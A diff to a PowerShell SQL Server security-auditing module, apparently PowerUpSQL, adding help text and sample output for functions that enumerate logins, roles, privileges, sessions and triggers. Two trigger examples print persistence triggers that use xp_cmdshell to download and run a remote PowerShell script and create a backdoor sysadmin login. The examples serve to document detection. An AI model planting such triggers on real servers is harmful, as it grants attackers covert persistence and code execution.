@@ -19,6 +19,7 @@
 # ----------------------------------
 #  Get-SQLConnectionObject
 # ----------------------------------
+# Author: Scott Sutherland
 # Reference: https://msdn.microsoft.com/en-us/library/ms188247.aspx
 Function  Get-SQLConnectionObject {
     [CmdletBinding()]
@@ -1416,7 +1417,44 @@ Function  Get-SQLDatabase {
 # ----------------------------------
 #  Get-SQLTable
 # ----------------------------------
+# Author: Scott Sutherland
 Function  Get-SQLTable {
+<#
+    .SYNOPSIS
+        Returns table information from target SQL Servers.
+    .PARAMETER Username
+        SQL Server or domain account to authenticate with.   
+    .PARAMETER Password
+        SQL Server or domain account password to authenticate with. 
+    .PARAMETER Credential
+        SQL Server credential. 
+    .PARAMETER Instance
+        SQL Server instance to connection to. 
+    .PARAMETER DatabaseName
+        Database name to filter for. 
+    .PARAMETER TableName
+        Table name to filter for. 
+    .PARAMETER NoDefaults
+        Filter out results from default databases. 
+    .EXAMPLE
+        PS C:\> Get-SQLTable -Instance SQLServer1\STANDARDDEV2014 -NoDefaults  -DatabaseName testdb
+
+        ComputerName : SQLServer1
+        Instance     : SQLServer1\STANDARDDEV2014
+        DatabaseName : testdb
+        SchemaName   : dbo
+        TableName    : NOCList
+        TableType    : BASE TABLE
+
+        ComputerName : SQLServer1
+        Instance     : SQLServer1\STANDARDDEV2014
+        DatabaseName : testdb
+        SchemaName   : dbo
+        TableName    : tracking
+        TableType    : BASE TABLE
+    .EXAMPLE
+        PS C:\> Get-SQLInstanceDomain | Get-SQLTable -Verbose -NoDefaults
+#>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory=$false,
@@ -2043,7 +2081,45 @@ Function  Get-SQLDatabaseSchema {
 # ----------------------------------
 #  Get-SQLView
 # ----------------------------------
+# Author: Scott Sutherland
 Function  Get-SQLView{
+<#
+    .SYNOPSIS
+        Returns view information from target SQL Servers.
+    .PARAMETER Username
+        SQL Server or domain account to authenticate with.   
+    .PARAMETER Password
+        SQL Server or domain account password to authenticate with. 
+    .PARAMETER Credential
+        SQL Server credential. 
+    .PARAMETER Instance
+        SQL Server instance to connection to. 
+    .PARAMETER DatabaseName
+        Database name to filter for.
+    .PARAMETER ViewName
+        View name to filter for. 
+    .PARAMETER NoDefaults
+        Only display results from non default databases. 
+    .EXAMPLE
+        PS C:\> Get-SQLView -Instance SQLServer1\STANDARDDEV2014 -DatabaseName master
+
+        ComputerName   : SQLServer1
+        Instance       : SQLServer1\STANDARDDEV2014
+        DatabaseName   : master
+        SchemaName     : dbo
+        ViewName       : spt_values
+        ViewDefinition : 
+                         create view spt_values as
+                         select name collate database_default as name,
+                             number,
+                             type collate database_default as type,
+                             low, high, status
+                         from sys.spt_values                 
+        IsUpdatable    : NO
+        CheckOption    : NONE
+    .EXAMPLE
+        PS C:\> Get-SQLInstanceDomain | Get-SQLView -Verbose
+#>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory=$false,
@@ -2410,6 +2486,33 @@ Function  Get-SQLServerCredential{
 #  Get-SQLServerLogin
 # ----------------------------------
 Function  Get-SQLServerLogin{
+<#
+    .SYNOPSIS
+        Returns logins from target SQL Servers.
+    .PARAMETER Username
+        SQL Server or domain account to authenticate with.   
+    .PARAMETER Password
+        SQL Server or domain account password to authenticate with. 
+    .PARAMETER Credential
+        SQL Server credential. 
+    .PARAMETER Instance
+        SQL Server instance to connection to. 
+    .PARAMETER PrincipalName
+        Pincipal name to filter for. 
+    .EXAMPLE
+        PS C:\> Get-SQLServerLogin -Instance SQLServer1\STANDARDDEV2014 | Select-Object -First 1
+
+        ComputerName  : SQLServer1
+        Instance      : SQLServer1\STANDARDDEV2014
+        PrincipalId   : 1
+        PrincipalName : sa
+        PrincipalSid  : 1
+        PrincipalType : SQL_LOGIN
+        CreateDate    : 4/8/2003 9:10:35 AM
+        IsLocked      : 0
+    .EXAMPLE
+        PS C:\> Get-SQLInstanceLocal | Get-SQLServerLogin -Verbose
+#>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory=$false,
@@ -2435,7 +2538,7 @@ Function  Get-SQLServerLogin{
         [Parameter(Mandatory=$false,
         ValueFromPipeline=$true,
         ValueFromPipelineByPropertyName=$true,
-        HelpMessage="PrincipalName.")]
+        HelpMessage="Principal name to filter for.")]
         [string]$PrincipalName
     )
 
@@ -2524,7 +2627,37 @@ Function  Get-SQLServerLogin{
 # ----------------------------------
 #  Get-SQLSession
 # ----------------------------------
+# Author: Scott Sutherland
 Function  Get-SQLSession{
+<#
+    .SYNOPSIS
+        Returns active sessions from target SQL Servers.  Sysadmin privileges is required to view all sessions.
+    .PARAMETER Username
+        SQL Server or domain account to authenticate with.   
+    .PARAMETER Password
+        SQL Server or domain account password to authenticate with. 
+    .PARAMETER Credential
+        SQL Server credential. 
+    .PARAMETER Instance
+        SQL Server instance to connection to. 
+    .EXAMPLE
+        PS C:\> Get-SQLSession -Instance SQLServer1\STANDARDDEV2014 | Select-Object -First 1
+
+        ComputerName          : SQLServer1
+        Instance              : SQLServer1\STANDARDDEV2014
+        PrincipalSid          : 010500000000000515000000F3864312345716CC636051C017100000
+        PrincipalName         : Domain\MyUser
+        OriginalPrincipalName : Domain\MyUser
+        SessionId             : 51
+        SessionStartTime      : 06/24/2016 09:26:21
+        SessionLoginTime      : 06/24/2016 09:26:21
+        SessionStatus         : running
+    .EXAMPLE
+        PS C:\> Get-SQLInstanceDomain | Get-SQLSession -Verbose
+    .EXAMPLE
+        PS C:\> (Get-SQLSession -Instance SQLServer1\STANDARDDEV2014).count
+        48
+#>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory=$false,
@@ -2643,7 +2776,28 @@ Function  Get-SQLSession{
 # ----------------------------------
 #  Get-SQLSysadminCheck
 # ----------------------------------
+# Author: Scott Sutherland
 Function  Get-SQLSysadminCheck{
+<#
+    .SYNOPSIS
+        Check if login is has sysadmin privilege on the target SQL Servers.
+    .PARAMETER Username
+        SQL Server or domain account to authenticate with.   
+    .PARAMETER Password
+        SQL Server or domain account password to authenticate with. 
+    .PARAMETER Credential
+        SQL Server credential. 
+    .PARAMETER Instance
+        SQL Server instance to connection to. 
+    .EXAMPLE
+        PS C:\> Get-SQLSysadminCheck -Instance SQLServer1\STANDARDDEV2014 
+
+        ComputerName   Instance                       IsSysadmin
+        ------------   --------                       ----------
+        SQLServer1     SQLServer1\STANDARDDEV2014     Yes 
+    .EXAMPLE
+        PS C:\> Get-SQLInstanceDomain | Get-SQLStoredProcure -Verbose -NoDefaults
+#>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory=$false,
@@ -2715,7 +2869,35 @@ Function  Get-SQLSysadminCheck{
 # ----------------------------------
 #  Get-SQLServiceAccount
 # ----------------------------------
+# Author: Scott Sutherland
 Function  Get-SQLServiceAccount{
+<#
+    .SYNOPSIS
+        Returns a list of service account names for SQL Servers services by querying the registry with xp_regread.  This can be executed against remote systems.
+    .PARAMETER Username
+        SQL Server or domain account to authenticate with.   
+    .PARAMETER Password
+        SQL Server or domain account password to authenticate with. 
+    .PARAMETER Credential
+        SQL Server credential. 
+    .PARAMETER Instance
+        SQL Server instance to connection to. 
+    .EXAMPLE
+        PS C:\> Get-SQLServiceAccount -Instance SQLServer1\STANDARDDEV2014 
+
+        ComputerName     : SQLServer1
+        Instance         : SQLServer1\STANDARDDEV2014
+        DBEngineLogin    : LocalSystem
+        AgentLogin       : NT Service\SQLAgent$STANDARDDEV2014
+        BrowserLogin     : NT AUTHORITY\LOCALSERVICE
+        WriterLogin      : LocalSystem
+        AnalysisLogin    : NT Service\MSOLAP$STANDARDDEV2014
+        ReportLogin      : NT Service\ReportServer$STANDARDDEV2014
+        IntegrationLogin : NT Service\MsDtsServer120
+
+    .EXAMPLE
+        PS C:\> Get-SQLInstanceDomain | Get-SQLServiceAccount -Verbose
+#>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory=$false,
@@ -3152,7 +3334,36 @@ Function  Get-SQLAuditServerSpec{
 # ----------------------------------
 #  Get-SQLServerPriv
 # ----------------------------------
+# Author: Scott Sutherland
 Function  Get-SQLServerPriv {
+<#
+    .SYNOPSIS
+        Returns SQL Server login privilege information from target SQL Servers.
+    .PARAMETER Username
+        SQL Server or domain account to authenticate with.   
+    .PARAMETER Password
+        SQL Server or domain account password to authenticate with. 
+    .PARAMETER Credential
+        SQL Server credential. 
+    .PARAMETER Instance
+        SQL Server instance to connection to. 
+    .PARAMETER PermissionName
+        Permission name to filter for. 
+    .EXAMPLE
+        PS C:\> Get-SQLServerPriv -Instance SQLServer1\STANDARDDEV2014 -PermissionName IMPERSONATE
+
+        ComputerName    : SQLServer1
+        Instance        : SQLServer1\STANDARDDEV2014
+        GranteeName     : public
+        GrantorName     : sa
+        PermissionClass : SERVER_PRINCIPAL
+        PermissionName  : IMPERSONATE
+        PermissionState : GRANT
+        ObjectName      : sa
+        ObjectType      : SQL_LOGIN
+    .EXAMPLE
+        PS C:\> Get-SQLInstanceLocal | Get-SQLServerPriv -Verbose
+#>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory=$false,
@@ -3647,7 +3858,42 @@ Function  Get-SQLDatabaseUser {
 # ----------------------------------
 #  Get-SQLServerRole
 # ----------------------------------
+# Author: Scott Sutherland
 Function  Get-SQLServerRole {
+<#
+    .SYNOPSIS
+        Returns SQL Server role information from target SQL Servers.
+    .PARAMETER Username
+        SQL Server or domain account to authenticate with.   
+    .PARAMETER Password
+        SQL Server or domain account password to authenticate with. 
+    .PARAMETER Credential
+        SQL Server credential. 
+    .PARAMETER Instance
+        SQL Server instance to connection to. 
+    .PARAMETER RolePrincipalName
+        Role principal name to filter for. 
+    .PARAMETER RoleOwner
+        Role owner name to filter for. 
+    .EXAMPLE
+        PS C:\> Get-SQLServerRole -Instance SQLServer1\STANDARDDEV2014 | Select-Object -First 1
+
+        ComputerName          : SQLServer1
+        Instance              : SQLServer1\STANDARDDEV2014
+        RolePrincipalId       : 2
+        RolePrincipalSid      : 2
+        RolePrincipalName     : public
+        RolePrincipalType     : SERVER_ROLE
+        OwnerPrincipalId      : 1
+        OwnerPrincipalName    : sa
+        is_disabled           : False
+        is_fixed_role         : False
+        create_date           : 4/13/2009 12:59:06 PM
+        modify_Date           : 4/13/2009 12:59:06 PM
+        default_database_name : 
+    .EXAMPLE
+        PS C:\> Get-SQLInstanceLocal | Get-SQLServerRole -Verbose
+#>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory=$false,
@@ -3786,7 +4032,49 @@ Function  Get-SQLServerRole {
 # ----------------------------------
 #  Get-SQLServerRoleMember
 # ----------------------------------
+# Author: Scott Sutherland
 Function  Get-SQLServerRoleMember {
+<#
+    .SYNOPSIS
+        Returns SQL Server role member information from target SQL Servers.
+    .PARAMETER Username
+        SQL Server or domain account to authenticate with.   
+    .PARAMETER Password
+        SQL Server or domain account password to authenticate with. 
+    .PARAMETER Credential
+        SQL Server credential. 
+    .PARAMETER Instance
+        SQL Server instance to connection to. 
+    .PARAMETER RolePrincipalName
+        Role principal name to filter for. 
+    .PARAMETER PrincipalName
+        Principal name to filter for. 
+    .EXAMPLE
+        PS C:\> Get-SQLServerRoleMember -Instance SQLServer1\STANDARDDEV2014 -PrincipalName MyUser
+
+        ComputerName      : SQLServer1
+        Instance          : SQLServer1\STANDARDDEV2014
+        RolePrincipalId   : 3
+        RolePrincipalName : sysadmin
+        PrincipalId       : 272
+        PrincipalName     : MyUser
+
+        ComputerName      : SQLServer1
+        Instance          : SQLServer1\STANDARDDEV2014
+        RolePrincipalId   : 6
+        RolePrincipalName : setupadmin
+        PrincipalId       : 272
+        PrincipalName     : MyUser
+
+        ComputerName      : SQLServer1
+        Instance          : SQLServer1\STANDARDDEV2014
+        RolePrincipalId   : 276
+        RolePrincipalName : MyCustomRole
+        PrincipalId       : 272
+        PrincipalName     : MyUser
+    .EXAMPLE
+        PS C:\> Get-SQLInstanceLocal | Get-SQLServerRoleMember -Verbose
+#>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory=$false,
@@ -4234,7 +4522,57 @@ Function  Get-SQLDatabaseRoleMember {
 # ----------------------------------
 #  Get-SQLTriggerDdl
 # ----------------------------------
+# Author: Scott Sutherland
 Function  Get-SQLTriggerDdl {
+<#
+    .SYNOPSIS
+        Returns DDL trigger information from target SQL Servers. This includes logon triggers.
+    .PARAMETER Username
+        SQL Server or domain account to authenticate with.   
+    .PARAMETER Password
+        SQL Server or domain account password to authenticate with. 
+    .PARAMETER Credential
+        SQL Server credential. 
+    .PARAMETER Instance
+        SQL Server instance to connection to. 
+    .PARAMETER TriggerName
+        Trigger name to filter for. 
+    .EXAMPLE
+        PS C:\> Get-SQLTriggerDdl -Instance SQLServer1\STANDARDDEV2014 
+
+        ComputerName      : SQLServer1
+        Instance          : SQLServer1\STANDARDDEV2014
+        TriggerName       : persistence_ddl_1
+        TriggerId         : 1104722988
+        TriggerType       : SERVER
+        ObjectType        : SQL_TRIGGER
+        ObjectClass       : SERVER
+        TriggerDefinition : -- Create the DDL trigger
+                            CREATE Trigger [persistence_ddl_1]
+                            ON ALL Server
+                            FOR DDL_LOGIN_EVENTS
+                            AS
+                     
+                            -- Download and run a PowerShell script from the internet
+                            EXEC master..xp_cmdshell 'Powershell -c "IEX(new-object 
+                            net.webclient).downloadstring(''https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/trigger_demo_ddl.ps1'')"';
+                     
+                            -- Add a sysadmin named 'SysAdmin_DDL' if it doesn't exist
+                            if (SELECT count(name) FROM sys.sql_logins WHERE name like 'SysAdmin_DDL') = 0
+                     
+                                -- Create a login
+                                CREATE LOGIN SysAdmin_DDL WITH PASSWORD = 'Password123!';
+                        
+                                -- Add the login to the sysadmin fixed server role
+                                EXEC sp_addsrvrolemember 'SysAdmin_DDL', 'sysadmin';
+                                                    
+        create_date       : 4/26/2016 8:34:49 PM
+        modify_date       : 4/26/2016 8:34:49 PM
+        is_ms_shipped     : False
+        is_disabled       : False
+    .EXAMPLE
+        PS C:\> Get-SQLInstanceDomain | Get-SQLTriggerDdl -Verbose
+#>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory=$false,
@@ -4320,7 +4658,64 @@ Function  Get-SQLTriggerDdl {
 # ----------------------------------
 #  Get-SQLTriggerDml
 # ----------------------------------
+# Author: Scott Sutherland
 Function  Get-SQLTriggerDml {
+<#
+    .SYNOPSIS
+        Returns DML trigger information from target SQL Servers.
+    .PARAMETER Username
+        SQL Server or domain account to authenticate with.   
+    .PARAMETER Password
+        SQL Server or domain account password to authenticate with. 
+    .PARAMETER Credential
+        SQL Server credential. 
+    .PARAMETER Instance
+        SQL Server instance to connection to. 
+    .PARAMETER DatabaseName
+        Database name to filter for.
+    .PARAMETER TriggerName
+        Trigger name to filter for. 
+    .EXAMPLE
+        PS C:\> Get-SQLTriggerDml -Instance SQLServer1\STANDARDDEV2014 -DatabaseName testdb
+
+        ComputerName           : SQLServer1
+        Instance               : SQLServer1\STANDARDDEV2014
+        DatabaseName           : testdb
+        TriggerName            : persistence_dml_1
+        TriggerId              : 565577053
+        TriggerType            : DATABASE
+        ObjectType             : SQL_TRIGGER
+        ObjectClass            : OBJECT_OR_COLUMN
+        TriggerDefinition      : -- Create trigger
+                                 CREATE TRIGGER [persistence_dml_1]
+                                 ON testdb.dbo.NOCList 
+                                 FOR INSERT, UPDATE, DELETE AS
+                          
+                                 -- Impersonate sa
+                                 EXECUTE AS LOGIN = 'sa'
+                          
+                                 -- Download a PowerShell script from the internet to memory and execute it
+                                 EXEC master..xp_cmdshell 'Powershell -c "IEX(new-object 
+                                 net.webclient).downloadstring(''https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/trigger_demo_dml.ps1'')"';
+                          
+                                 -- Add a sysadmin named 'SysAdmin_DML' if it doesn't exist
+                                 if (select count(*) from sys.sql_logins where name like 'SysAdmin_DML') = 0
+                          
+                                     -- Create a login
+                                     CREATE LOGIN SysAdmin_DML WITH PASSWORD = 'Password123!';
+                             
+                                     -- Add the login to the sysadmin fixed server role
+                                     EXEC sp_addsrvrolemember 'SysAdmin_DML', 'sysadmin';
+                         
+        create_date            : 4/26/2016 8:58:28 PM
+        modify_date            : 4/26/2016 8:58:28 PM
+        is_ms_shipped          : False
+        is_disabled            : False
+        is_not_for_replication : False
+        is_instead_of_trigger  : False        
+    .EXAMPLE
+        PS C:\> Get-SQLInstanceDomain | Get-SQLTriggerDml -Verbose
+#>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory=$false,
@@ -4427,7 +4822,45 @@ Function  Get-SQLTriggerDml {
 # ----------------------------------
 #  Get-SQLStoredProcure
 # ----------------------------------
+# Author: Scott Sutherland
 Function  Get-SQLStoredProcure {
+<#
+    .SYNOPSIS
+        Returns stored procedures from target SQL Servers.
+        Note: Viewing procedure definitions requires the sysadmin role or the VIEW DEFINITION permission.
+    .PARAMETER Username
+        SQL Server or domain account to authenticate with.   
+    .PARAMETER Password
+        SQL Server or domain account password to authenticate with. 
+    .PARAMETER Credential
+        SQL Server credential. 
+    .PARAMETER Instance
+        SQL Server instance to connection to. 
+    .PARAMETER DatabaseName
+        Database name to filter for. 
+    .PARAMETER ProcedureName
+        Procedure name to filter for. 
+    .PARAMETER NoDefaults
+        Filter out results from default databases. 
+    .EXAMPLE
+        PS C:\> Get-SQLStoredProcure -Instance SQLServer1\STANDARDDEV2014 -NoDefaults -DatabaseName testdb
+
+        ComputerName        : SQLServer1
+        Instance            : SQLServer1\STANDARDDEV2014
+        DatabaseName        : testdb
+        SchemaName          : dbo
+        ProcedureName       : MyTestProc
+        ProcedureType       : PROCEDURE
+        ProcedureDefinition : CREATE PROC MyTestProc
+                              WITH EXECUTE AS OWNER 
+                              as
+                              begin
+                              select SYSTEM_USER as currentlogin, ORIGINAL_LOGIN() as originallogin                              
+                              end
+    .EXAMPLE
+        PS C:\> Get-SQLInstanceDomain | Get-SQLStoredProcure -Verbose -NoDefaults
+#>
+
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory=$false,
